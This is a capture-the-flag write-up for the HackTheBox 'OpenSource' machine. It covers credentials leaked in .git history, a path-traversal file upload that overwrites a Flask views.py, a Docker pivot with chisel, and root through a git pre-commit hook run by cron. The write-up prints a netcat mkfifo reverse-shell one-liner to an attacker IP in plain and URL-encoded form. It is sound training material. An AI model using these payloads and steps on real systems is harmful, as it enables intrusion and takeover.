---
title: HackTheBox - OpenSource 
categories: [HackTheBox, HTB-Linux]
description: OpenSource is an easy difficulty box
date: 2022-06-22 
comments: true
tags: [linux-priv-esc/sudo/gtfo-bin, exploit/file-upload-bypass ]
img_path: /Writeups/HackTheBox/Linux/OpenSource/images/
image:
  src: Pasted%20image%2020220810021625.png
  width: 1000   # in pixels
  height: 400   # in pixels
---

# Overview 
This machine is hosting a webpage that allows user to test a file upload web application and download its source code. However, the source code is archived together with a directory .git, revealing user credentials. 

Also, after analzying the source code, there is a way to exploit the file upload application due to the lack of/insufficient user input sanitization. The exploit is done by adding a remote code execution functionality into views.py from the source code and replacing it w/ the webpage's via the file upload test instance, allowing us to obtain a shell.

For the privilege escalation part, we have to escalate our privileges twice, to Dev01 and to root. The initial shell we obtained is in a docker environment, and there exists a internal service on port 3000. Through chisel we are able to escape docker environment and access the internal service on port 3000 running gitea. We are able to login to gitea w/ the credentials from earlier (.git directory) and obtain dev01 SSH private key

On the system, pspy64 revealed that there is a cronjob running as root executing git. Git contains a GTFOBins entry allowing us to privilege escalate to root.

---

| Column       | Details      |
| ------------ | ------------ |
| Box Name     | OpenSource   |
| IP           | 10.10.11.164 |
| Points       | -            |
| Difficulty   | Easy         |
| Creator      | [irogir](https://app.hackthebox.com/users/476556)          |
| Release Date |   22-May-2022           |



# Recon

## TCP/80 (HTTP)
### FFUF
```
200      GET       45l      144w     1563c http://10.10.11.164/console
200      GET     9803l    56722w  2489147c http://10.10.11.164/download
```
- `console`
- `download`

## TCP/3000 (?)
- Filtered

# Initial Foothold

## TCP/80 (HTTP) - .git Directory
1. Proceed to `http://10.10.11.164`	
	![](Pasted%20image%2020220622192252.png)
	- We are able download and view the source code by clicking the download button
2. After clicking download, `source.zip` is downloaded 
	![](Pasted%20image%2020220622204731.png)
	- `.git` could reveal sensitive information
3. View extract and view the contents of source.zip 
	- We have knowledge of the app's directory structure and code
4. We are able to extract additional information from `.git` directory 

	``` 
	┌──(root💀kali)-[~/htb/open_source/10.10.11.164/loot/.git]
	└─# git branch
	  dev
	* public
	┌──(root💀kali)-[~/htb/open_source/10.10.11.164/loot/.git]
	└─# git log dev
	commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev)
	Author: gituser <gituser@local>
	Date:   Thu Apr 28 13:47:24 2022 +0200

		ease testing

	commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
	Author: gituser <gituser@local>
	Date:   Thu Apr 28 13:46:54 2022 +0200

		added gitignore

	commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
	Author: gituser <gituser@local>
	Date:   Thu Apr 28 13:46:16 2022 +0200

		updated

	commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
	Author: gituser <gituser@local>
	Date:   Thu Apr 28 13:45:17 2022 +0200

	```
5. After viewing the commits, commit `a76f8f75f7a4a12b706b0cf9c983796fa1985820` contains sensitive information
	``` 
	┌──(root💀kali)-[~/htb/open_source/10.10.11.164/loot/.git]
	└─# git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
	commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
	Author: gituser <gituser@local>
	Date:   Thu Apr 28 13:46:16 2022 +0200

		updated

	diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
	new file mode 100644
	index 0000000..5975e3f
	--- /dev/null
	+++ b/app/.vscode/settings.json
	@@ -0,0 +1,5 @@
	+{
	+  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
	+  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
	+  "http.proxyStrictSSL": false
	+}
	diff --git a/app/app/views.py b/app/app/views.py
	index f2744c6..0f3cc37 100644
	--- a/app/app/views.py
	+++ b/app/app/views.py
	@@ -6,7 +6,17 @@ from flask import render_template, request, send_file
	 from app import app


	-@app.route('/', methods=['GET', 'POST'])
	+@app.route('/')
	+def index():
	+    return render_template('index.html')
	+
	+
	+@app.route('/download')
	+def download():
	+    return send_file(os.path.join(os.getcwd(), "app", "static", "source.zip"))
	+
	+
	+@app.route('/upcloud', methods=['GET', 'POST'])
	 def upload_file():
		 if request.method == 'POST':
			 f = request.files['file']
	@@ -20,4 +30,4 @@ def upload_file():
	 @app.route('/uploads/<path:path>')
	 def send_report(path):
		 path = get_file_name(path)
	-    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
	\ No newline at end of file
	+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

	```
	- dev01:Soulless_Developer#2022
6. Proceed to `http://10.10.11.164/upcloud` & attempt to upload `php-reverse-shell.php`
	![](Pasted%20image%2020220622212605.png)
7. However visiting `http://10.10.11.164/uploads/php-reverse-shell.php` does not execute the reverse shell, instead the file is downloaded

## TCP/80 (HTTP) - Exploiting Upcloud by analyzing the source code
1. After browsing through the source code, found a way to exploit the application
	- `views.py`
		![](Pasted%20image%2020220622205247.png)
	-`utils.py`
		![](Pasted%20image%2020220622205458.png)
		- `../` is replaced
2. `os.path.join` is exploitable 
	``` 

	Source: https://www.geeksforgeeks.org/python-os-path-join-method/
	# Python program to explain os.path.join() method

	# importing os module
	import os

	# Path
	path = "/home"

	# Join various path components
	print(os.path.join(path, "User/Desktop", "file.txt"))


	# Path
	path = "User/Documents"

	# Join various path components
	print(os.path.join(path, "/home", "file.txt"))

	# In above example '/home'
	# represents an absolute path
	# so all previous components i.e User / Documents
	# are thrown away and joining continues
	# from the absolute path component i.e / home.


	# Path
	path = "/User"

	# Join various path components
	print(os.path.join(path, "Downloads", "file.txt", "/home"))

	# In above example '/User' and '/home'
	# both represents an absolute path
	# but '/home' is the last value
	# so all previous components before '/home'
	# will be discarded and joining will
	# continue from '/home'

	# Path
	path = "/home"

	# Join various path components
	print(os.path.join(path, "User/Public/", "Documents", ""))

	# In above example the last
	# path component is empty
	# so a directory separator ('/')
	# will be put at the end
	# along with the concatenated value

	```
	- We are able to upload a file wherever we want since we are able to **throw away the previous path** `public` & `upload` 
	- For e.g. we wish to upload a file to /home directory, we have to name our file
		- `/home/test.txt`
		![](vmware_ZARksh0E1v.gif)
		- This GIF recorded after I have obtained a shell (STEP 8) to prove that `os.path.join` can be exploited this way.
		- We have not obtained a shell at this point.
3. Earlier at we tried to include `php-reverse-shell.php` but the file is not executed 
4. Instead we have to replace `views.py` with our own version of it that will execute a reverse shell by exploiting `os.path.join`
5. Add command execute functionality into `views.py`
	![](Pasted%20image%2020220622213126.png)
6. Replace `views.py` and test whether our command execution functionality works
	![](Pasted%20image%2020220622214144.png)
	![](vmware_g2dbCRTyYF.gif)
	- Server is pinging our machine
7. Reverse shell payload
	- Reverse Shell
	``` 
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.82 4444 >/tmp/f
	```
	- URL Encoded
	``` 
	rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.82%204444%20%3E%2Ftmp%2Ff
	```
8. Obtain shell
	![](vmware_EgRtOFfRY8.gif)

# Privilege Escalation

## Dev01 - Docker Escape + Pivot
1. After looking through the forums for help, I found out that we have to pivot to another machine in order to access TCP/3000 where it was filtered during our NMAP scan
2. Proceed to `/`, we are in a docker environment
	``` 
	/ # ls -la
	total 72
	drwxr-xr-x    1 root     root          4096 Jun 22 14:23 .
	drwxr-xr-x    1 root     root          4096 Jun 22 14:23 ..
	-rwxr-xr-x    1 root     root             0 Jun 22 14:23 .dockerenv
	drwxr-xr-x    1 root     root          4096 Jun 22 16:03 app
	drwxr-xr-x    1 root     root          4096 Mar 17 05:52 bin
	drwxr-xr-x    5 root     root           340 Jun 22 14:23 dev
	drwxr-xr-x    1 root     root          4096 Jun 22 14:23 etc
	drwxr-xr-x    2 root     root          4096 May  4 16:35 home
	drwxr-xr-x    1 root     root          4096 May  4 16:35 lib
	drwxr-xr-x    5 root     root          4096 May  4 16:35 media
	drwxr-xr-x    2 root     root          4096 May  4 16:35 mnt
	drwxr-xr-x    2 root     root          4096 May  4 16:35 opt
	dr-xr-xr-x  275 root     root             0 Jun 22 14:23 proc
	drwx------    1 root     root          4096 May  4 16:35 root
	drwxr-xr-x    1 root     root          4096 Jun 22 14:23 run
	drwxr-xr-x    1 root     root          4096 Mar 17 05:52 sbin
	drwxr-xr-x    2 root     root          4096 May  4 16:35 srv
	dr-xr-xr-x   13 root     root             0 Jun 22 14:23 sys
	drwxrwxrwt    1 root     root          4096 Jun 22 15:53 tmp
	drwxr-xr-x    1 root     root          4096 May  4 16:35 usr
	drwxr-xr-x    1 root     root          4096 May  4 16:35 var
	```
3. Find out the IP address of the machine we just compromised
	``` 
	/app # 	ifconfig
	eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
			  inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
			  UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
			  RX packets:15434 errors:0 dropped:0 overruns:0 frame:0
			  TX packets:10755 errors:0 dropped:0 overruns:0 carrier:0
			  collisions:0 txqueuelen:0 
			  RX bytes:17808811 (16.9 MiB)  TX bytes:9245580 (8.8 MiB)

	lo        Link encap:Local Loopback  
			  inet addr:127.0.0.1  Mask:255.0.0.0
			  UP LOOPBACK RUNNING  MTU:65536  Metric:1
			  RX packets:2354 errors:0 dropped:0 overruns:0 frame:0
			  TX packets:2354 errors:0 dropped:0 overruns:0 carrier:0
			  collisions:0 txqueuelen:1000 
			  RX bytes:195576 (190.9 KiB)  TX bytes:195576 (190.9 KiB)

	/app # 
	```
4. Some information about docker escape
	- https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
	>The IP address of the docker container is 172.17.0.2 and the host machine mostly creates an interface that acts as a gateway for the Docker network. And, generally, the first IP address of the range is used for that i.e. 172.17.0.1 in this case.
5. We are trying to pivot into the actual machine, so instead of using IP `172.17.0.2`, we use `172.17.0.1`, as the docker container `172.17.0.2` is unable to communicate with our Kali machine directly. (Im not very sure about this)
6. Use chisel to pivot
	1. Kali
		``` 
		┌──(root💀kali)-[~/tools/chisel]
		└─# chisel server --reverse --port 1337
		```
	2. Target
		``` 
		/app # ./chiselLinux64 client 10.10.14.16:1337 R:8888:172.17.0.1:3000 &
		```
		![](Pasted%20image%2020220623002006.png)
1. Access the newly opened port 
	![](Pasted%20image%2020220623002101.png)
8. Found a familiar username
	![](Pasted%20image%2020220623002136.png)
9. Earlier, we found credentials for user `dev01`
	- `dev01:Soulless_Developer#2022`
10. Successfully login
	![](Pasted%20image%2020220623002309.png)
12. Found SSH private key
	![](Pasted%20image%2020220623003350.png)
13. SSH w/ found private key
	``` 
	┌──(root💀kali)-[~/htb/open_source]
	└─# mv id_rsa.txt id_rsa

	┌──(root💀kali)-[~/htb/open_source]
	└─# ssh -i id_rsa dev01@10.10.11.164
	```
	![](Pasted%20image%2020220623003447.png)



## Root - Via Cronjob
1. Ran linpeas, did not find any vulnerabilities to exploit
2. Ran `pspy64` to sniff root processes, found an interesting process that is executed periodically
	![](Pasted%20image%2020220623015528.png)
3. Our current user `dev01` has the git directory in his home directory, we are able to edit files in it
4. Git has a [GTFO entry](https://gtfobins.github.io/gtfobins/git/)
	- When git is run by a superuser, it does not drop elevated privileges
5. Since git commit is running periodically, we are able to create `pre-commit` to spawn a root shell
	- `pre-commit` is executed everytime commit is run
	- https://www.atlassian.com/git/tutorials/git-hooks
6. Create `pre-commit` and make it executable 
	![](Pasted%20image%2020220623011505.png)
	``` 
	dev01@opensource:~/.git/hooks$ chmod +x pre-commit

	```
7. Wait for cronjob to execute
	![](Pasted%20image%2020220623015238.png)
8. Root obtained
	![](Pasted%20image%2020220623011747.png)

9. Cronjob that was running

	``` 
	root@opensource:~# crontab -l
	# Edit this file to introduce tasks to be run by cron.
	# 
	# Each task to run has to be defined through a single line
	# indicating with different fields when the task will be run
	# and what command to run for the task
	# 
	# To define the time you can provide concrete values for
	# minute (m), hour (h), day of month (dom), month (mon),
	# and day of week (dow) or use '*' in these fields (for 'any').# 
	# Notice that tasks will be started based on the cron's system
	# daemon's notion of time and timezones.
	# 
	# Output of the crontab jobs (including errors) is sent through
	# email to the user the crontab file belongs to (unless redirected).
	# 
	# For example, you can run a backup of all your user accounts
	# at 5 a.m every week with:
	# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
	# 
	# For more information see the manual pages of crontab(5) and cron(8)
	# 
	# m h  dom mon dow   command
	@reboot sleep 15 ; /root/meta/start.sh
	* * * * * /usr/local/bin/git-sync
	*/2 * * * * /root/meta/app/clean.sh
	*/2 * * * * cp /root/config /home/dev01/.git/config
	
	root@opensource:~# /usr/local/bin/git-sync
	Changes detected, pushing..
	cp: cannot create regular file '/tmp/rootbash': Text file busy

	^C
	root@opensource:~# 
	```





